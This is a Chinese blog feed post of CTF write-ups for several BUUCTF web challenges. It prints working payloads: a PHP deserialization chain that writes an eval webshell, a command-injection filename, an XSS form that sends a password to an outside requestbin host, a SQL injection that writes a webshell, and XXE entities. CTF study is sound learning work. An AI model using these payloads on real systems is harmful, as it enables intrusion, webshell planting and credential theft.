<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>WJW&#39;s Blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-07-27T01:37:51.317Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>WJW</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>buu4</title>
    <link href="http://example.com/2021/07/08/buu4/"/>
    <id>http://example.com/2021/07/08/buu4/</id>
    <published>2021-07-08T13:18:45.000Z</published>
    <updated>2021-07-27T01:37:51.317Z</updated>
    
    <content type="html"><![CDATA[<h2 id="EIS-2019-EzPOP"><a href="#EIS-2019-EzPOP" class="headerlink" title="[EIS 2019]EzPOP"></a>[EIS 2019]EzPOP</h2><p>—easypop没有那么easy</p><span id="more"></span><p>源代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class A &#123;</span><br><span class="line"></span><br><span class="line">    protected $store;</span><br><span class="line"></span><br><span class="line">    protected $key;</span><br><span class="line"></span><br><span class="line">    protected $expire;</span><br><span class="line"></span><br><span class="line">    public function __construct($store, $key = &#x27;flysystem&#x27;, $expire = null) &#123;</span><br><span class="line">        $this-&gt;key = $key;</span><br><span class="line">        $this-&gt;store = $store;</span><br><span class="line">        $this-&gt;expire = $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function cleanContents(array $contents) &#123;</span><br><span class="line">        $cachedProperties = array_flip([</span><br><span class="line">            &#x27;path&#x27;, &#x27;dirname&#x27;, &#x27;basename&#x27;, &#x27;extension&#x27;, &#x27;filename&#x27;,</span><br><span class="line">            &#x27;size&#x27;, &#x27;mimetype&#x27;, &#x27;visibility&#x27;, &#x27;timestamp&#x27;, &#x27;type&#x27;,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        foreach ($contents as $path =&gt; $object) &#123;</span><br><span class="line">            if (is_array($object)) &#123;</span><br><span class="line">                $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return $contents;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getForStorage() &#123;</span><br><span class="line">        $cleaned = $this-&gt;cleanContents($this-&gt;cache);</span><br><span class="line"></span><br><span class="line">        return json_encode([$cleaned, $this-&gt;complete]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function save() &#123;</span><br><span class="line">        $contents = $this-&gt;getForStorage();</span><br><span class="line"></span><br><span class="line">        $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        if (!$this-&gt;autosave) &#123;</span><br><span class="line">            $this-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B &#123;</span><br><span class="line"></span><br><span class="line">    protected function getExpireTime($expire): int &#123;</span><br><span class="line">        return (int) $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getCacheKey(string $name): string &#123;</span><br><span class="line">        return $this-&gt;options[&#x27;prefix&#x27;] . $name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected function serialize($data): string &#123;</span><br><span class="line">        if (is_numeric($data)) &#123;</span><br><span class="line">            return (string) $data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $serialize = $this-&gt;options[&#x27;serialize&#x27;];</span><br><span class="line"></span><br><span class="line">        return $serialize($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function set($name, $value, $expire = null): bool&#123;</span><br><span class="line">        $this-&gt;writeTimes++;</span><br><span class="line"></span><br><span class="line">        if (is_null($expire)) &#123;</span><br><span class="line">            $expire = $this-&gt;options[&#x27;expire&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $expire = $this-&gt;getExpireTime($expire);</span><br><span class="line">        $filename = $this-&gt;getCacheKey($name);</span><br><span class="line"></span><br><span class="line">        $dir = dirname($filename);</span><br><span class="line"></span><br><span class="line">        if (!is_dir($dir)) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                mkdir($dir, 0755, true);</span><br><span class="line">            &#125; catch (\Exception $e) &#123;</span><br><span class="line">                // 创建失败</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = $this-&gt;serialize($value);</span><br><span class="line"></span><br><span class="line">        if ($this-&gt;options[&#x27;data_compress&#x27;] &amp;&amp; function_exists(&#x27;gzcompress&#x27;)) &#123;</span><br><span class="line">            //数据压缩</span><br><span class="line">            $data = gzcompress($data, 3);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = &quot;&lt;?php\n//&quot; . sprintf(&#x27;%012d&#x27;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;</span><br><span class="line">        $result = file_put_contents($filename, $data);</span><br><span class="line"></span><br><span class="line">        if ($result) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;src&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = &quot;uploads/&quot;;</span><br><span class="line"></span><br><span class="line">if (!is_dir($dir))</span><br><span class="line">&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[&quot;data&quot;]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对于反序列化的问题，先来看看unserialize()函数位置，其会将get传入的data反序列化，我们的payload也就是通过data传入。</p><p>然后分析整个序列化，有两个类，A类和B类。</p><p>先看看A类中的方法，<code>cleanContents</code>方法中，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public function cleanContents(array $contents)</span><br><span class="line">  &#123;</span><br><span class="line">      $cachedProperties = array_flip([</span><br><span class="line">          &#x27;path&#x27;, &#x27;dirname&#x27;, &#x27;basename&#x27;, &#x27;extension&#x27;, &#x27;filename&#x27;,</span><br><span class="line">          &#x27;size&#x27;, &#x27;mimetype&#x27;, &#x27;visibility&#x27;, &#x27;timestamp&#x27;, &#x27;type&#x27;,</span><br><span class="line">      ]);</span><br><span class="line"></span><br><span class="line">      foreach ($contents as $path =&gt; $object) &#123;</span><br><span class="line">          if (is_array($object)) &#123;</span><br><span class="line">              $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      return $contents;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">array_intersect_key()函数使用键名比较计算数组的交集</span><br><span class="line"></span><br><span class="line">返回一个数组，该数组包含了所有出现在 第一个参数数组和其它参数数组中同时存在的键名的值。</span><br></pre></td></tr></table></figure><p>前面是数组赋值，后面数组遍历并将两个数组的交集赋给$contents[$path]<br>所以我们$object的键选$cachedProperties中的任意一个即可，这里选path，值是我们的shell的url编码后的base64编码。</p><p>再看看B类</p><p><code>getCacheKey</code>方，prefix用于文件名构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    public function getCacheKey(string $name): string</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;options[&#x27;prefix&#x27;] . $name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$filename = $this-&gt;getCacheKey($name);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>还有后面写入文件的时候，前面拼接的php代码会导致我们后面拼接的一句话木马无法执行。</p><p>为了绕过这里，我们可以将其base64编码再解码，由于base64解码前面那部分会变成乱码，后面的一句话木马就可以执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$data   = &quot;&lt;?php\n//&quot; . sprintf(&#x27;%012d&#x27;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;</span><br><span class="line">$result = file_put_contents($filename, $data);</span><br></pre></td></tr></table></figure><p>但是这里要注意base64编码的长度问题，需要一句话木马，前面的部分加起来的字节数为4的倍数，这样才不会影响base64解码导致一句话木马失效。关于base64编码解码绕过可以看看，<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">这篇文章</a></p><p>exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">protected $store;</span><br><span class="line">protected $key;</span><br><span class="line">protected $expire;</span><br><span class="line">public function __construct()</span><br><span class="line">&#123;</span><br><span class="line">$this-&gt;key=&#x27;hack.php&#x27;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">public function start($tmp)&#123;</span><br><span class="line">$this-&gt;store=$tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B&#123;</span><br><span class="line">public $options;</span><br><span class="line">&#125;</span><br><span class="line">$a=new A();</span><br><span class="line">$b=new B();</span><br><span class="line">$b-&gt;options[&#x27;prefix&#x27;] = &quot;php://filter/write=convert.base64-decode/resource=&quot;;</span><br><span class="line">$b-&gt;options[&#x27;expire&#x27;] = 11;</span><br><span class="line">$b-&gt;options[&#x27;data_compress&#x27;] = false;</span><br><span class="line">$b-&gt;options[&#x27;serialize&#x27;] = &#x27;strval&#x27;;</span><br><span class="line">$a-&gt;start($b);</span><br><span class="line">$object = array(&quot;path&quot;=&gt;&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg&quot;);</span><br><span class="line">$path = &#x27;123&#x27;;</span><br><span class="line">$a-&gt;cache = array($path=&gt;$object);</span><br><span class="line">$a-&gt;complete = &#x27;1&#x27;;</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>生成后传入参数先生成hack.php文件后，再访问hack.php，然后通过执行命令获得flag。</p><p><img src="buu4.md/1.png"></p><h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><p>观察url发现page参数可以利用php伪协议读取文件。</p><p>读取一下guest、user，guest里面没什么东西，在user.php中包含function.php文件</p><p><img src="buu4.md/2.png"></p><p>我们读取一下function.php这里面有主要函数，还有几个类似flag的参数，访问一下，提示在m4aaannngggeee有东西，再次读取m4aaannngggeee，包含了一个上传的页面，但是这里不是文件上传漏洞的利用，我们再尝试直接访问m4aaannngggeee。这里才是真正的文件上传漏洞位置。</p><p>由于在upllloadddd.php源码中存在这句话，我们可以执行任意命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;.$filename.&quot; | base64 -w 0&quot;);</span><br></pre></td></tr></table></figure><p>我们通过上传的文件名来执行任意代码。</p><p><img src="buu4.md/3.png"></p><p>成功执行。</p><p>已经知道flag不在该目录，我们访问下一级，拿到flag。</p><p>最终文件名的payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cd ..;cat flag_233333;#</span><br></pre></td></tr></table></figure><h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p>文件包含的题目</p><p>首先进入页面就是帐号密码错误，然后f12发现md5加密secret连接用户名要全等于密码，这个secret要怎么找到，其实我们抓包一下就可以解决很多问题，将响应包里的hash值传入pass参数，即可。</p><p>返回有一个flflflflag.php，里面存在通过file传参的文件包含。</p><p>通过伪协议读取一下index.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><p>解码，发现包含了一个config.php，再读取一下，解码，flag不再里面。</p><p>这里没有其他思路了，我们扫一下目录，发现dir.php,再用伪协议读取一下。</p><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(scandir(&#x27;/tmp&#x27;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>tmp是临时文件，这里考查PHP临时文件包含漏洞利用，一般分两种</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、通过利用可以访问的phpinfo页面，对其一次发送大量的数据造成临时文件没有被及时删除，这样我们就可以访问到phpinfo。</span><br><span class="line">2、PHP版本小于7.2,利用PHP崩溃留下的临时文件。</span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from io import BytesIO</span><br><span class="line"></span><br><span class="line">url=&quot;&quot;</span><br><span class="line">payload=&quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">files=&#123;</span><br><span class="line">&quot;file&quot;:BytesIO(payload.encode())</span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url=url,files=files,allow_redirects=False)#禁止重定向</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>访问dir.php,得到临时生成的文件名，访问一下可以得到phpinfo</p><p>但是这里需要抓包查看phpinfo信息，因为页面还是会跳转到404.</p><p>在response里就可以找到flag。</p><p>参考<a href="https://www.cnblogs.com/linuxsec/articles/11278477.html">https://www.cnblogs.com/linuxsec/articles/11278477.html</a></p><p>以上是预期解，还有一个非预期解，通过session.upload_progress进行session文件包含</p><p>参考<a href="https://blog.csdn.net/rfrder/article/details/114656092">https://blog.csdn.net/rfrder/article/details/114656092</a></p><h2 id="GWCTF-2019-mypassword"><a href="#GWCTF-2019-mypassword" class="headerlink" title="[GWCTF 2019]mypassword"></a>[GWCTF 2019]mypassword</h2><p>根据题目，应该是需要得到密码，注册会实现跳转，但是到登录的时候没有响应。</p><p>应该跟js代码有关系，这里刚好把js代码放在很明显的位置。看了代码，就是把用户名和密码写入了表单。</p><p>登录成功后，我们发现Feedback中有注释提示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">if(is_array($feedback))&#123;</span><br><span class="line">echo &quot;&lt;script&gt;alert(&#x27;反馈不合法&#x27;);&lt;/script&gt;&quot;;</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line">$blacklist = [&#x27;_&#x27;,&#x27;\&#x27;&#x27;,&#x27;&amp;&#x27;,&#x27;\\&#x27;,&#x27;#&#x27;,&#x27;%&#x27;,&#x27;input&#x27;,&#x27;script&#x27;,&#x27;iframe&#x27;,&#x27;host&#x27;,&#x27;onload&#x27;,&#x27;onerror&#x27;,&#x27;srcdoc&#x27;,&#x27;location&#x27;,&#x27;svg&#x27;,&#x27;form&#x27;,&#x27;img&#x27;,&#x27;src&#x27;,&#x27;getElement&#x27;,&#x27;document&#x27;,&#x27;cookie&#x27;];</span><br><span class="line">foreach ($blacklist as $val) &#123;</span><br><span class="line">        while(true)&#123;</span><br><span class="line">            if(stripos($feedback,$val) !== false)&#123;</span><br><span class="line">                $feedback = str_ireplace($val,&quot;&quot;,$feedback);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>黑名单过滤，由于前端的login.js具有记录密码的功能，所以我们构造一个表单在feedback页面提交，通过<a href="http://http.requestbin.buuoj.cn/%E6%8E%A5%E5%8F%97flag%E3%80%82">http://http.requestbin.buuoj.cn/接受flag。</a></p><p>POC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;incookieput type=&quot;text&quot; name=&quot;username&quot;&gt;</span><br><span class="line">&lt;incookieput type=&quot;password&quot; name=&quot;password&quot;&gt;</span><br><span class="line">&lt;scrcookieipt scookierc=&quot;./js/login.js&quot;&gt;&lt;/scrcookieipt&gt;</span><br><span class="line">&lt;scrcookieipt&gt;</span><br><span class="line">    var psw = docucookiement.getcookieElementsByName(&quot;password&quot;)[0].value;</span><br><span class="line">    docucookiement.locacookietion=&quot;http://http.requestbin.buuoj.cn/18l3qd91/?a=&quot;+psw;</span><br><span class="line">&lt;/scrcookieipt&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>都是使用cookie黑名单进行绕过</p><p>本题又拓宽了思路，本题的方法与前面我们学习了dnslog数据外带类似。</p><h2 id="SUCTF-2018-MultiSQL"><a href="#SUCTF-2018-MultiSQL" class="headerlink" title="[SUCTF 2018]MultiSQL"></a>[SUCTF 2018]MultiSQL</h2><p>看题目与堆叠注入有关，支持多语句执行。</p><p>通过测试，许多sql关键字都被过滤了，我们使用新方法sql预处理写入一句话木马。</p><p>通过char绕过，来构造一句话木马</p><p>脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">str=&quot;select &#x27;&lt;?php eval($_POST[1]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/hhh.php&#x27;;&quot;</span><br><span class="line">len_str=len(str)</span><br><span class="line">for i in range(0,len_str):</span><br><span class="line">if i == 0:</span><br><span class="line">print(&#x27;char(%s&#x27;%ord(str[i]),end=&quot;&quot;)</span><br><span class="line">else:</span><br><span class="line">print(&#x27;,%s&#x27;%ord(str[i]),end=&quot;&quot;)</span><br><span class="line">print(&#x27;)&#x27;)</span><br></pre></td></tr></table></figure><p>然后通过<a href="https://www.cnblogs.com/jierong12/p/8882534.html">预处理</a>写入一句话木马</p><p>最终payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=6;set%20@sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,104,97,99,107,46,112,104,112,39,59);prepare%20query%20from%20@sql;execute%20query;</span><br></pre></td></tr></table></figure><h2 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h2><p>题目提示写一个shell</p><p>代码审计一下，有一个函数file_put_contents，我们通过data参数可以写入到目录下，我们先通过传入pwd查看目录，再通过data尝试写入一句话木马。</p><p>想异或构造一句话木马写入，被过滤了。只好试一下其他的。</p><p>考虑使用短标签，也是本题的突破口。</p><p><a href="https://www.php.net/manual/zh/language.basic-syntax.phptags.php">PHP短标签</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= ?&gt;</span><br><span class="line">相当于</span><br><span class="line">&lt;?php echo ?&gt;</span><br></pre></td></tr></table></figure><p>所以我们可以通过短标签输出我们想要的结果。</p><p>同时，php中反引号可以将反引号的内容当作shell命令执行。</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`whoami`?&gt;</span><br></pre></td></tr></table></figure><p>执行成功</p><p>然后通过命令ls查看文件，这里试了很多个，只有%09绕过空格。</p><p>有时候多试试，就成功了。</p><p>最终payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=upload&amp;data=&lt;?=`cat%09/flllllll1112222222lag`?&gt;</span><br></pre></td></tr></table></figure><p>本题的知识点前面有遇到过，需要多温故。再绕过空格的时候需要多一些耐心，也要先POC一下，再构造其他payload。</p><h2 id="GoogleCTF2019-Quals-Bnv"><a href="#GoogleCTF2019-Quals-Bnv" class="headerlink" title="[GoogleCTF2019 Quals]Bnv"></a>[GoogleCTF2019 Quals]Bnv</h2><p>一开始就是一段盲文，也看不出题目有什么提示。</p><p>我们抓包看一下，会通过json数据提交我们选择的信息。</p><p>猜测存在XXE漏洞。</p><p>我们先将Content-Type修改成application/xml</p><p>返回的是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Start tag expected, &#x27;&lt;&#x27; not found, line 1, column 1</span><br></pre></td></tr></table></figure><p>少了标签不符合xml的格式。</p><p>想直接利用最简单的xxe注入，但是被限制了，返回root和DTD没有匹配到我们任意构造的DTD。</p><p>那一步步来构造把。</p><p>先构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;message&gt;135601360123502401401250</span><br><span class="line">&lt;/message&gt;</span><br></pre></td></tr></table></figure><p>返回了没有找到DTD文件，我们试着添加一个实体。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message</span><br><span class="line">[</span><br><span class="line">&lt;!ENTITY hhh &quot;135601360123502401401250&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;&amp;hhh;</span><br><span class="line">&lt;/message&gt;</span><br></pre></td></tr></table></figure><p>报错没有元素的声明，我们需要在DTD中声明我们已经定义的元素，通过使用数据，指定名为message的元素来实现，定义类型设置数据为PC数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message</span><br><span class="line">[</span><br><span class="line">&lt;!ELEMENT message (#PCDATA)&gt;</span><br><span class="line">&lt;!ENTITY hhh &quot;135601360123502401401250&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;&amp;hhh;</span><br><span class="line">&lt;/message&gt;</span><br></pre></td></tr></table></figure><p>成功正确返回我们提交的信息了，现在需要构造读flag。</p><p>我们试着添加一个外部实体来发出出口请求。</p><p>这里有一个不错的平台</p><p><a href="https://beeceptor.com/">https://beeceptor.com/</a></p><p>提供一个子域，可以保存向该网站发出的所有请求的日志。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message</span><br><span class="line">[</span><br><span class="line">&lt;!ELEMENT message (#PCDATA)&gt;</span><br><span class="line">&lt;!ENTITY hhh &quot;135601360123502401401250&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;https://beeceptor.com/console/abcdef&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;&amp;hhh;</span><br><span class="line">&lt;/message&gt;</span><br></pre></td></tr></table></figure><p>返回无法加载。</p><p>试着加载文件，返回可以加载文件，但不符合xml格式。</p><p>枚举出flag的位置，然后读取flag，不允许我们使用外部实体来读取，我们需要需要内部DTD。</p><p><a href="https://mohemiv.com/tags/xxe/">XXE注入内部DTD的使用</a></p><p>这里是linux系统，使用模板</p><figure class="highlight 